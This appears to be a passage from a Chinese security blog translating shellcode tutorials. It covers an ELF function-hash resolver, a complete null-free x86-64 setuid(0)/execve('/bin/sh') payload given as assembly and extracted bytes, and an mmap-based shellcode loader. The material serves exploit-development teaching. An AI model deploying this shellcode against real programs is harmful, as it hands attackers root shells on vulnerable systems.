            <span class="keyword">rol</span> <span class="literal">edx</span>, <span class="number">0xc</span>    <span class="comment">;right shift 12bits</span>
            <span class="keyword">add</span> <span class="literal">edx</span>, <span class="literal">eax</span>    <span class="comment">;add eax to edx</span>
            <span class="keyword">test</span> <span class="literal">al</span>, <span class="literal">al</span>     <span class="comment">; if al='\0'</span>
            <span class="keyword">jnz</span> calc_hash_loop
<span class="label">
    calc_done:</span>
        <span class="keyword">push</span> <span class="literal">rdx</span>
        <span class="keyword">pop</span> <span class="literal">rsi</span> <span class="comment">; move hash in rdx to rsi</span>

    <span class="keyword">pop</span> <span class="literal">rdx</span>
    <span class="keyword">pop</span> <span class="literal">rax</span> <span class="comment">; restore rdx&amp;rax</span>
<span class="keyword">ret</span>
<span class="label">
startup:</span>
    <span class="keyword">pop</span> <span class="literal">rax</span> <span class="comment">; pointer to calc_hash</span>
    <span class="keyword">pop</span> <span class="literal">rax</span> <span class="comment">; argc</span>
    <span class="keyword">pop</span> <span class="literal">rsi</span> <span class="comment">; pointer to argv[]</span>

    <span class="keyword">xor</span> <span class="literal">rdx</span>, <span class="literal">rdx</span>    <span class="comment">;rdx=0</span>
    <span class="keyword">call</span> calc_hash

    <span class="keyword">push</span> <span class="literal">rsi</span>    <span class="comment">; save hash on stack</span>
    <span class="keyword">mov</span> <span class="literal">rsi</span>, <span class="literal">rsp</span>    <span class="comment">; rsi hold pointer to hash now</span>

    <span class="keyword">push</span> <span class="literal">rdx</span>    <span class="comment">; null</span>
    <span class="keyword">mov</span> <span class="literal">rcx</span>, <span class="literal">rsp</span>    <span class="comment">; rcx hold pointer to null now</span>

    <span class="keyword">mov</span> <span class="literal">rdi</span>, <span class="number">0x4</span>
<span class="label">    loop:</span>
        <span class="comment">; 倒着复制的</span>
        <span class="keyword">dec</span> <span class="literal">rdi</span>
        <span class="keyword">mov</span> <span class="literal">al</span>, [<span class="literal">rsi</span>+<span class="literal">rdi</span>*<span class="number">1</span>]
        <span class="keyword">mov</span> [<span class="literal">rcx</span>+<span class="literal">rdx</span>*<span class="number">1</span>], <span class="literal">al</span>
        <span class="keyword">inc</span> <span class="literal">rdx</span>
        <span class="keyword">cmp</span> <span class="literal">rdi</span>, <span class="number">0</span>  <span class="comment">; gas 竟然不能cmp %rdi, $0....但可以倒过来</span>
        <span class="keyword">jnz</span> <span class="keyword">loop</span>

    <span class="keyword">mov</span> <span class="literal">rsi</span>, <span class="literal">rcx</span>    <span class="comment">;rsi hold pointer to reverse hash</span>
    <span class="keyword">inc</span> <span class="literal">rdi</span> <span class="comment">; rdi = 1</span>
    <span class="keyword">mov</span> <span class="literal">rax</span>, <span class="literal">rdi</span>    <span class="comment">; rax = 1</span>
    <span class="keyword">syscall</span>         <span class="comment">; write(1, reverse hash)</span>

    <span class="keyword">mov</span> <span class="literal">rax</span>, <span class="number">0x3c</span>   <span class="comment">; rax=60</span>
    <span class="keyword">dec</span> <span class="literal">rdi</span>         <span class="comment">; rdi=0</span>
    <span class="keyword">syscall</span>         <span class="comment">; exit(0)</span>
 ~/Work/project/blackhat/shellcode  nasm -felf64 hash-generator.s -o hash-generator.o
 ~/Work/project/blackhat/shellcode  ld hash-generator.o -o hash-generator
 ~/Work/project/blackhat/shellcode  ./hash-generator exit|hexdump -C
<span class="number">00000000</span>  <span class="number">69</span> 6c <span class="number">47</span> <span class="number">80</span>                                       |ilG.|
<span class="number">00000004</span>
</code></pre><p>所以，<code>_world</code>这么写</p>
<pre><code><span class="label">_world:</span>
    <span class="keyword">push</span> <span class="number">0x696c4780</span>
    <span class="keyword">pop</span> <span class="literal">rbp</span> <span class="comment">; 正好倒过来，看看hash-generator.s的代码</span>
    <span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
    <span class="keyword">call</span> [<span class="literal">rcx</span>]
</code></pre><p>开发者应该记着当调用那些可能改变寄存器的调用函数时保存<code>rcx</code>。或者通过更改<code>__initialize_world</code>中pop到的寄存器来移除限制。</p>
<h3 id="调用的函数">调用的函数</h3><p>这个注释是为了防止开发者忘记接口功能：</p>
<pre><code><span class="comment">;</span>
<span class="comment">;  Takes a function hash in %rbp and base pointer in %rbx</span>
<span class="comment">;  &gt;Parses the dynamic program headers of the ELF64 image</span>
<span class="comment">;  &gt;Uses ROP to invoke the function on the way back to the</span>
<span class="comment">;  -normal return location</span>
<span class="comment">;</span>
<span class="comment">;  Returns results of function to invoke.</span>
<span class="comment">;</span>
</code></pre><p>所有和libc交互的寄存器和任何可能被链接器使用的寄存器必须被保留，这样它们才能在函数调用时被恢复，<code>rbp</code>寄存器被保留两次。这时因为第一次保留在返回前被指向目的函数的指针覆盖。这让shellcode从目的函数返回到开发者定义的函数。</p>
<pre><code><span class="label">invoke_function:</span>
    <span class="keyword">push</span> <span class="literal">rbp</span>
    <span class="keyword">push</span> <span class="literal">rbp</span>
    <span class="keyword">push</span> <span class="literal">rdx</span>
    <span class="keyword">push</span> <span class="literal">rdi</span>
    <span class="keyword">push</span> <span class="literal">rax</span>
    <span class="keyword">push</span> <span class="literal">rbx</span>
    <span class="keyword">push</span> <span class="literal">rsi</span>
</code></pre><p>将<code>rdx</code>赋为0,吧函数哈希放入<code>rdi</code>来进行将来的比较</p>
<pre><code><span class="label">set_regs:</span>
    <span class="keyword">xor</span> <span class="literal">rdx</span>, <span class="literal">rdx</span>
    <span class="keyword">push</span> <span class="literal">rbp</span>
    <span class="keyword">pop</span> <span class="literal">rdi</span>
</code></pre><p>然后目的库导入的基址指针就放入<code>rbp</code></p>
<pre><code><span class="label">copy_base:</span>
    <span class="keyword">push</span> <span class="literal">rbx</span>
    <span class="keyword">pop</span> <span class="literal">rbp</span>
</code></pre><p>需要读取<code>[rbx+0x130]</code>四字节，但是添加到八字节的寄存器。</p>
<pre><code><span class="label">read_dynamic_section:</span>
    <span class="keyword">push</span> <span class="number">0x4c</span>
    <span class="keyword">pop</span> <span class="literal">rax</span>
    <span class="keyword">add</span> <span class="literal">rbx</span>, [<span class="literal">rbx</span> + <span class="literal">rax</span> * <span class="number">4</span>]
</code></pre><p>找到函数导出表，一般叫做<code>.dynsym</code>，或者动态符号表。通过遍历头检查动态节的类型。</p>
<pre><code><span class="label">check_dynamic_type:</span>
    <span class="keyword">add</span> <span class="literal">rbx</span>, <span class="number">0x10</span>
    cmpb [<span class="literal">rbx</span>], <span class="number">0x5</span>
    <span class="keyword">jne</span> check_dynamic_type
</code></pre><p>一旦ebx指向程序头中正确的位置;放置字符串表的绝对地址到<code>rax</code>和动态符号表的绝对地址到<code>rbx</code>。</p>
<pre><code><span class="label">string_table_found:</span>
    <span class="keyword">mov</span> <span class="literal">rax</span>, [<span class="literal">rbx</span>+<span class="number">0x8</span>]  <span class="comment">; rax是动态字符串表的地址</span>
    <span class="keyword">mov</span> <span class="literal">rbx</span>, [<span class="literal">rbx</span>+<span class="number">0x18</span>] <span class="comment">; rbx是指向符号表的地址</span>
</code></pre><p>接着，增加到下一个导出，指向字符串的指针被放入<code>rsi</code>来哈希</p>
<pre><code><span class="label">check_next_hash:</span>
    <span class="keyword">add</span> <span class="literal">rbx</span>, <span class="number">0x18</span>   <span class="comment">;下一个条目</span>
    <span class="keyword">push</span> <span class="literal">rdx</span>
    <span class="keyword">pop</span> <span class="literal">rsi</span>
    <span class="keyword">xor</span> <span class="literal">si</span>, [<span class="literal">rbx</span>]
    <span class="keyword">add</span> <span class="literal">rsi</span>, <span class="literal">rax</span>
</code></pre><p><code>calc_hash</code>标签被如上描述方式调用来哈希函数名。</p>
<pre><code><span class="label">calc_hash:</span>
    ...
</code></pre><p>比较当前导出表的函数哈希和想要导出的函数哈希，如果不匹配则跳到下一次导入：</p>
<pre><code><span class="label">check_current_hash:</span>
    <span class="keyword">cmp</span> <span class="literal">edi</span>, <span class="literal">esi</span>
    <span class="keyword">jne</span> check_next_hash
</code></pre><p>一旦哈希被找到，它的函数偏移位于<code>[rbx+0x8]</code>四字节。<code>rdx</code>被用来作为零寄存器来得到没有<code>\x00</code>的四字节。FIXME(not so) 添加到<code>rbp</code>基址指针：</p>
<pre><code><span class="label">found_hash:</span>
    <span class="keyword">add</span> <span class="literal">rbp</span>, [<span class="literal">rbx</span>+<span class="number">4</span>*<span class="literal">rdx</span>+<span class="number">0x8</span>]
</code></pre><p>这里，第一个例子中被保留的<code>rbp</code>被目的函数的地址覆盖。</p>
<pre><code><span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x30</span>], <span class="literal">rbp</span>
</code></pre><p>最后恢复所有寄存器。</p>
<pre><code>    <span class="keyword">pop</span> <span class="literal">rsi</span>
    <span class="keyword">pop</span> <span class="literal">rbx</span>
    <span class="keyword">pop</span> <span class="literal">rax</span>
    <span class="keyword">pop</span> <span class="literal">rdi</span>
    <span class="keyword">pop</span> <span class="literal">rdx</span>
    <span class="keyword">pop</span> <span class="literal">rbp</span>
<span class="keyword">ret</span>
</code></pre><p>跳到目的函数代码。</p>
<h3 id="动态shell">动态shell</h3><p>一旦添加链接器，一个115字节的socket重用载荷就变成了268字节的动态载入版本。这里有几种优化的方式，作为读者的练习。。。我得回头看看。。。</p>
<p>算了，我先看看<a href="http://eli.thegreenplace.net/2011/08/25/load-time-relocation-of-shared-libraries/" target="_blank" rel="external">Load-time relocation of shared libraries</a></p>
<p>令上午承蒙翔哥内推，刚填了简历，下午竟然就给我打电话电面了。。。然后就是强行谈及二进制安全被血虐最后被鄙视的过程，哈哈哈。</p>
<p>慢慢看，不把安全作为工作也许是种幸福呢。</p>
<p>毕业前：</p>
<ul>
<li>游戏</li>
<li>画</li>
</ul>
<p>兴趣：</p>
<ul>
<li>统计学习</li>
<li>二进制安全</li>
</ul>
<p>工作：</p>
<ul>
<li>？</li>
</ul>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2015/03/16/shellcode/" itemprop="url">
                  Shellcode
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-03-16T00:00:00+08:00" content="2015-03-16">
              2015-03-16
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2015/03/16/shellcode/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2015/03/16/shellcode/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>意译：<a href="http://blackhat.life/Shellcode" target="_blank" rel="external">category:Shellcode</a></p>
<p>Shellcode，也叫bytecode，是用在缓冲区溢出漏洞挖掘中的机器码(用十六进制表示的二进制文件)，或者为了方便人类阅读写成汇编。程序员能使用机器码，用汇编方法写任何应用程序(就像所有其它高级编程语言一样)。并且不像很多语言只限定在某个操作系统或指令架构上。</p>
<p>shellcode需要位计算、linux汇编和栈溢出的基础知识。</p>
<p>[TOC]</p>
<p>每种语言最后都解释为二进制，不管是编译的(compile-time)还是解释(runtime)。编写缓冲区溢出时要记住，有很多潜在的来自安全机制的障碍(比如DEP、ASLR、防火墙、或者IDS或者IPS应用)。一次面对现代对策的成功漏洞利用，需要利用许多过滤绕过和IDS侵入技术。</p>
<h2 id="类型">类型</h2><p>根据执行代码的目标环境有许多类型的shellcode，在OSI模型不同层次有不同种类的对策，需要有不同的技术来成功挖掘指定的应用漏洞。</p>
<h3 id="可执行程序(executable)_vs_基于返回的(return-oriented)">可执行程序(executable) vs 基于返回的(return-oriented)</h3><p>大致从运行时观点看有两种shellcode：可执行shellcode和基于返回的shellcode。这要看目标环境是否能执行数据栈来决定选择哪种。如果目标合适，基于返回的shellcode无视栈是否能执行，而可执行的shellcode只能在可执行栈上运行。</p>
<ul>
<li><p>可执行shellcode在它相应的目标操作系统中用汇编写成，大多数可执行shellcode，或者传统的null-free shellcode，可以用在任何有漏洞且有可执行栈的应用上。</p>
</li>
<li><p>基于返回的shellcode当堆栈不可执行时利用ROP(return oriented programming).通常通过构造调用栈模仿正常的编译程序来调用可执行shellcode。因为调用栈被视为数据，这在漏洞挖掘中绕过了需要栈可执行的限制。</p>
</li>
</ul>
<p>然而，特定指令集架构比如MIPS，不能使用基于返回的编程技术或者传统的堆栈溢出，因为它们不在栈上存储返回地址。</p>
<h3 id="对策和措施">对策和措施</h3><p>尽管传统二进制shellcode通常能顺利工作在没过滤机制、没打补丁、或者大输入的情况下，许多目标环境和应用也有许多限制因素来组织传统机器码执行。许多C或者C++写成的应用都需要机器码是null-free的(没有<code>\x00</code>)，这就是为何null-free shellcode是可执行shellcode编程的传统基础形式。</p>
<ul>
<li>字符过滤可以利用多态(自修改)来在允许字符集外运行时构造字节，来绕过限制。许多字符过滤限制到可打印字符集，所以ascii和alphanumeric shellcode变成该技术的主导技术。</li>
<li>字符编码能通过编码载荷使之解码为相应的十六进制机器码绕过。通常代码必须在被拷贝到有漏洞的缓冲区前经过unicode、base64、大小写转换或者其它解码仍然存在。</li>
<li>缓冲区尺寸也许惊人有限，某些环境中载荷太大不能放入缓冲区，这时就需要二次注入技术(second-order-injection)。结果是shellcode尺寸保持在最小来优化重用。</li>
<li>防火墙通过阻碍外出连接或者监听socket接收流量来限制远程shellcode。绕过防火墙技术可以通过文件描述符重用技术实现。</li>
<li>分析者可能调试有漏洞的应用尝试逆向工程挖掘过程。int3断点探测和单向哈希(one-way hashing)技术能组织取证分析工具比如volatility</li>
<li>签名通常特别阻止linux shellcode因为系统调用传统上被用来作为C调用风格的接口，因此大多给定shellcode的静态部分都有个C接口。甚至多态和自修改代码通常都生成包含系统调用的shellcodes。系统调用可以通过子链接代码实现。</li>
</ul>
<h2 id="shellcode机理">shellcode机理</h2><p>shellcode通常用汇编写成。尽管有人能记住助记符表来直接写机器码，这并不适合初学者所以不推荐。</p>
<p>环境因子：</p>
<ul>
<li>许多应用和安全措施组件都部分过滤输入，限制指令集的可能。有时候这在覆盖返回地址时甚至都有影响。</li>
<li>操作系统对C API有不同的处理。通常(不是总是)linux上的shellcode依赖内核终端或者没链接的(unlinked)调用，而微软windows不提供中断API，shellcode必须利用PE解析来执行运行时链接。</li>
</ul>
<h2 id="汇编代码">汇编代码</h2><p>创建一个叫<code>test_shellcode.s</code>的文件</p>
<p>这个例子使用hatter的32字节 null-free payload，这个shellcode完成<code>setuid(0);execve(&#39;/bin/sh&#39;, null, null)</code>。拷贝以下代码到<code>test_shellcode.s</code>并保存。</p>
<pre><code><span class="built_in">BITS</span> <span class="number">64</span>
<span class="built_in">global</span> _start
<span class="label">start:</span>
    <span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
    <span class="keyword">push</span> <span class="preprocessor">qword</span> <span class="number">0x69</span>
    <span class="keyword">pop</span> <span class="literal">rax</span>
    <span class="keyword">syscall</span>

    <span class="keyword">push</span> <span class="literal">rdi</span>
    <span class="keyword">push</span> <span class="literal">rdi</span>
    <span class="keyword">pop</span> <span class="literal">rsi</span>
    <span class="keyword">pop</span> <span class="literal">rdx</span>
    <span class="keyword">push</span> <span class="preprocessor">qword</span> <span class="number">0x68</span>
    <span class="keyword">mov</span> <span class="literal">rax</span>, <span class="preprocessor">qword</span> <span class="number">0x7361622f6e69622f</span>
    <span class="keyword">push</span> <span class="literal">rax</span>
    <span class="keyword">push</span> <span class="literal">rsp</span>
    <span class="keyword">pop</span> <span class="literal">rdi</span>
    <span class="keyword">push</span> <span class="preprocessor">qword</span> <span class="number">0x3b</span>
    <span class="keyword">pop</span> <span class="literal">rax</span>
    <span class="keyword">syscall</span>
</code></pre><p>我又是用nasm编译而不是gas。。。</p>
<pre><code>nasm <span class="built_in">test</span>_shellcode.s -o <span class="built_in">test</span>_shellcode.o
</code></pre><h2 id="提取shellcode">提取shellcode</h2><p>提取二进制字节码有许多方法，objdump可以(不过这时nasm生成的目标文件不包含二进制文件信息，所以要指定<code>nasm -felf64</code>这样生成包含符号表或者ELF文件头的文件), hexdump可以看。。。。。。不过译者喜欢用ndiasm，显然必须指定类型什么的。</p>
<pre><code> ~/Work/project/blackhat/shellcode  ndisasm -b64 -pamd test_shellcode.o
<span class="number">00000000</span>  <span class="number">4831F</span>F            xor rdi,rdi
<span class="number">00000003</span>  <span class="number">6</span>A69              push byte +<span class="number">0x69</span>
<span class="number">00000005</span>  <span class="number">58</span>                pop rax
<span class="number">00000006</span>  <span class="number">0F</span>05              syscall
<span class="number">00000008</span>  <span class="number">57</span>                push rdi
<span class="number">00000009</span>  <span class="number">57</span>                push rdi
<span class="number">0000000</span>A  <span class="number">5</span>E                pop rsi
<span class="number">0000000</span>B  <span class="number">5</span>A                pop rdx
<span class="number">0000000</span>C  <span class="number">6</span>A68              push byte +<span class="number">0x68</span>
<span class="number">0000000</span>E  <span class="number">48</span>B82F62696E2F62  mov rax,<span class="number">0x7361622f6e69622f</span>
         -<span class="number">6173</span>
<span class="number">00000018</span>  <span class="number">50</span>                push rax
<span class="number">00000019</span>  <span class="number">54</span>                push rsp
<span class="number">0000001</span>A  <span class="number">5F</span>                pop rdi
<span class="number">0000001</span>B  <span class="number">6</span>A3B              push byte +<span class="number">0x3b</span>
<span class="number">0000001</span>D  <span class="number">58</span>                pop rax
<span class="number">0000001</span>E  <span class="number">0F</span>05              syscall
</code></pre><p>中间部分包含指定汇编的字节指令。大多数调试器也展示对应汇编代码的十六进制记法。</p>
<pre><code> <span class="special">~</span>/Work/project/blackhat/shellcode  od -t x1 test_shellcode.o | awk '<span class="special">{</span><span class="formula">$1=""; print<span class="special">}</span>'|sed 'N;s/<span class="command">\n</span>//g;s/ /<span class="command">\\</span>x/g' 
<span class="command">\x</span>48<span class="command">\x</span>31<span class="command">\xff</span><span class="command">\x</span>6a<span class="command">\x</span>69<span class="command">\x</span>58<span class="command">\x</span>0f<span class="command">\x</span>05<span class="command">\x</span>57<span class="command">\x</span>57<span class="command">\x</span>5e<span class="command">\x</span>5a<span class="command">\x</span>6a<span class="command">\x</span>68<span class="command">\x</span>48<span class="command">\xb</span>8<span class="command">\x</span>2f<span class="command">\x</span>62<span class="command">\x</span>69<span class="command">\x</span>6e<span class="command">\x</span>2f<span class="command">\x</span>62<span class="command">\x</span>61<span class="command">\x</span>73<span class="command">\x</span>50<span class="command">\x</span>54<span class="command">\x</span>5f<span class="command">\x</span>6a<span class="command">\x</span>3b<span class="command">\x</span>58<span class="command">\x</span>0f<span class="command">\x</span>05</span>
</code></pre><h3 id="shellcode反汇编">shellcode反汇编</h3><p>许多次你看到来自‘野外的’shellcode，例如分析恶意软件和新的exploit，这时你需要反汇编shellcode来学习。最简单的方式是使用objdump(还是习惯ndiasm，呵呵)本例我们使用我们构建的实例。</p>
<p>就是这么简单：</p>
<pre><code> ~/Work/project/blackhat/shellcode   echo -en <span class="string">"\x48\x31\xff\x6a\x69\x58\x0f\x05\x57\x57\x5e\x5a\x48\xbf\x6a\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"</span> &gt; shellcode ; ndisasm -b64 -pamd shellcode      
<span class="number">00000000</span>  <span class="number">4831F</span>F            xor rdi,rdi
<span class="number">00000003</span>  <span class="number">6</span>A69              push byte +<span class="number">0x69</span>
<span class="number">00000005</span>  <span class="number">58</span>                pop rax
<span class="number">00000006</span>  <span class="number">0F</span>05              syscall
<span class="number">00000008</span>  <span class="number">57</span>                push rdi
<span class="number">00000009</span>  <span class="number">57</span>                push rdi
<span class="number">0000000</span>A  <span class="number">5</span>E                pop rsi
<span class="number">0000000</span>B  <span class="number">5</span>A                pop rdx
<span class="number">0000000</span>C  <span class="number">48</span>BF6A2F62696E2F  mov rdi,<span class="number">0x68732f6e69622f6a</span>
         -<span class="number">7368</span>
<span class="number">00000016</span>  <span class="number">48</span>C1EF08          shr rdi,byte <span class="number">0x8</span>
<span class="number">0000001</span>A  <span class="number">57</span>                push rdi
<span class="number">0000001</span>B  <span class="number">54</span>                push rsp
<span class="number">0000001</span>C  <span class="number">5F</span>                pop rdi
<span class="number">0000001</span>D  <span class="number">6</span>A3B              push byte +<span class="number">0x3b</span>
<span class="number">0000001F</span>  <span class="number">58</span>                pop rax
<span class="number">00000020</span>  <span class="number">0F</span>05              syscall
</code></pre>
            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2015/03/16/shellcodeloaders/" itemprop="url">
                  Shellcode/Loaders
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-03-16T00:00:00+08:00" content="2015-03-16">
              2015-03-16
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2015/03/16/shellcodeloaders/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2015/03/16/shellcodeloaders/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>意译：<a href="http://blackhat.life/Shellcode_Loaders" target="_blank" rel="external">Shellcode/Loaders</a></p>
<p>shellcode Loader被用在缓冲区溢出或者其它形式的二进制挖掘活动中测试shellcode。最好的方法嘛，构建从命令行参数的用户友好的loader，并且传递给刚分配的可执行内存空间。本文在x86指令集写x64汇编来在linux上构建这么个载入器。</p>
<p>32位的在文末给出</p>
<p>[TOC]</p>
<h2 id="可执行loader">可执行loader</h2><h3 id="命令行参数">命令行参数</h3><p>命令行参数入栈的顺序是：第二个参数，第一个参数，参数数目。因此，为了从参数获得shellcode，<code>pop rbx</code>三次。一旦完成，<code>rbx</code>将包含指向shellcode的指针：</p>
<pre><code><span class="built_in">BITS</span> <span class="number">64</span>
<span class="built_in">global</span> _start
<span class="label">_start:</span>
    <span class="keyword">pop</span> <span class="literal">rbx</span> <span class="comment">;argc</span>
    <span class="keyword">pop</span> <span class="literal">rbx</span> <span class="comment">; 参数列表指针</span>
    <span class="keyword">pop</span> <span class="literal">rbx</span> <span class="comment">; 指向第一个参数的指针</span>
</code></pre><h3 id="通过mmap()分配可执行内存区域">通过mmap()分配可执行内存区域</h3><p>参考x64 syscall table，自己谷歌就好。</p>
<p>现代操作系统的栈默认并不可执行，但我们成功执行代码需要一个可执行栈。这可以通过mmap系统调用实现。</p>
<p><code>mmap()</code>的原型是(<code>man mmap</code>)：</p>
<pre><code><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, size_t length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags,
                 <span class="keyword">int</span> fd, off_t offset)</span></span>;
</code></pre><p>在64位处理器上，函数调用如下：</p>
<pre><code>function_call(<span class="variable">%rax</span>) = function(<span class="variable">%rdi</span>,  <span class="variable">%rsi</span>,  <span class="variable">%rdx</span>,  <span class="variable">%r10</span>,  <span class="variable">%r8</span>,  <span class="variable">%r9</span>)
              ^<span class="keyword">system</span>          ^arg1  ^arg2  ^arg3  ^arg4  ^arg5 ^arg6
               call <span class="comment">#</span>
</code></pre><p>首先，<code>mmap()</code>的系统调用数(syscall number)放入<code>rax</code>：</p>
<pre><code><span class="keyword">push</span> <span class="number">0x9</span>
<span class="keyword">pop</span> <span class="literal">rax</span>
</code></pre><p><code>mmap()</code>的第一个参数需要是<code>null</code>，所以<code>xor rdi rdi</code>。</p>
<pre><code><span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
</code></pre><p>指定缓冲区大小(4096字节或者0x1000字节) ，这个参数传给<code>rsi</code></p>
<pre><code><span class="keyword">push</span> <span class="literal">rdi</span>
<span class="keyword">pop</span> <span class="literal">rsi</span> <span class="comment">; rsi = 0</span>
<span class="keyword">inc</span> <span class="literal">rsi</span> <span class="comment">; rsi = 1</span>
<span class="keyword">shl</span> <span class="literal">rsi</span>, <span class="number">0xc</span>  <span class="comment">; rsi=0x1000</span>
</code></pre><p>第三个参数<code>prot</code>保存在<code>rdx</code>中，是内核权限标志(读、写、执行或无)，对多个标志，它们用按位或方式合在一起，<code>PROT_READ|PROT_WRITE|PROT_EXEC</code>是数字<code>7</code>,所以直接在<code>rdx</code>中放入7就行。</p>
<pre><code><span class="keyword">push</span> <span class="number">0x7</span>
<span class="keyword">pop</span> <span class="literal">rdx</span>
</code></pre><p>接下来的参数<code>flag</code>跟<code>prot</code>类似，保存了内存映射标志。本例中设置为<code>MAP_PRIVATE|MAP_ANONYMOUS</code>，其值为数字<code>0x22</code>。存储在<code>r10</code>中。</p>
<pre><code><span class="keyword">push </span><span class="number">0x22</span>
<span class="keyword">pop </span><span class="literal">r10</span>
</code></pre><p>最后两个参数应该为<code>null</code>，放到<code>r8</code>和<code>r9</code>中</p>
<pre><code><span class="keyword">push</span> <span class="literal">rdi</span>
<span class="keyword">push</span> <span class="literal">rdi</span>
<span class="keyword">pop</span> <span class="literal">r8</span>
<span class="keyword">pop</span> <span class="literal">r9</span>
</code></pre><p>万事具备，进行系统调用。</p>
<pre><code><span class="keyword">syscall</span>
</code></pre><p>接下来<code>rax</code>中就包含指向缓冲区的指针，这个指针可以用来把shellcode拷贝进去。</p>
<h3 id="拷贝代码到新内存区域">拷贝代码到新内存区域</h3><p>把<code>rsi</code>作为计数器，初始化为0：</p>
<pre><code>inject：
    <span class="keyword">xor</span> <span class="literal">rsi</span>, <span class="literal">rsi</span>
</code></pre><p>把<code>rdi</code>设为<code>null</code>，等下要把当前字节和<code>dil</code>(rdi低8位)中的值比较来确定shellcode的结束位置。</p>
<pre><code><span class="keyword">push</span> <span class="literal">rsi</span>
<span class="keyword">pop</span> <span class="literal">rdi</span>
</code></pre><p>如果拷贝到达shellcode末尾，则跳到<code>inject_finished</code>：</p>
<pre><code><span class="label">inject_loop:</span>
    <span class="keyword">cmp</span> [<span class="literal">rbx</span> + <span class="literal">rsi</span> * <span class="number">1</span>], <span class="literal">dil</span>
    <span class="keyword">je</span> inject_finished
</code></pre><p>每个字节从<code>[rbx + rsi]</code>移动到<code>[rax + rsi]</code>，通过<code>r10b</code>(<code>r10</code>低八位)。</p>
<pre><code><span class="keyword">mov</span> <span class="literal">r10b</span>, [<span class="literal">rbx</span>+<span class="literal">rsi</span>*<span class="number">1</span>]
<span class="keyword">mov</span> [<span class="literal">rax</span>+<span class="literal">rsi</span>*<span class="number">1</span>], <span class="literal">r10b</span>
</code></pre><p><code>rsi</code>作为偏移量和计数器：</p>
<pre><code><span class="keyword">inc</span> <span class="literal">rsi</span>
</code></pre><p>继续循环</p>
<pre><code><span class="keyword">jmp</span> inject_loop:
</code></pre><p>在<code>inject_finished</code>程序出附上<code>ret</code>操作符(opcode)<code>0xc3</code></p>
<pre><code><span class="label">inject_finished:</span>
    <span class="keyword">mov</span> <span class="preprocessor">byte</span> [<span class="literal">rax</span>+<span class="literal">rsi</span>*<span class="number">1</span>], <span class="number">0xc3</span>
</code></pre><p>一般，操作符(opcode)指指令而字节码(bytecode)不仅包含操作符还包含参数，成为操作数(operand)。</p>
<h3 id="返回代码">返回代码</h3><p>代码返回而不是跳转或被调用的原因在于，这更充分模拟了类似有漏洞应用在缓冲区溢出时的环境。有效载荷会返回，因此，当shellcode被加载后，它应该返回。</p>
<p>首先调用<code>ret_to_shellcode</code>。这会把<code>exit</code>的地址推入栈顶，于是shellcode结束后返回<code>exit</code>的地址。</p>
<pre><code><span class="built_in">call</span> ret_to_shellcode
</code></pre><p>原始的返回地址被覆盖为为shellcode的地址，并且进入(returned into)</p>
<pre><code><span class="label">ret_to_shellcode:</span>
    <span class="keyword">push</span> rax
    <span class="keyword">ret</span>
</code></pre><p>当shellcode结束时，将返回到<code>exit</code>函数优雅的退出</p>
<pre><code>exit：
    <span class="keyword">push</span> <span class="number">60</span>
    <span class="keyword">pop</span> <span class="literal">rax</span>
    <span class="keyword">xor</span> <span class="literal">rdi</span>, <span class="literal">rdi</span>
    <span class="keyword">syscall</span>
</code></pre><h3 id="执行loader">执行loader</h3><p>编译链接吧</p>
<pre><code> <span class="special">~</span>/Work/project/blackhat/shellcode  nasm -felf64 loader64.s -o loader64.o
 <span class="special">~</span>/Work/project/blackhat/shellcode  ld loader64.o -o loader64
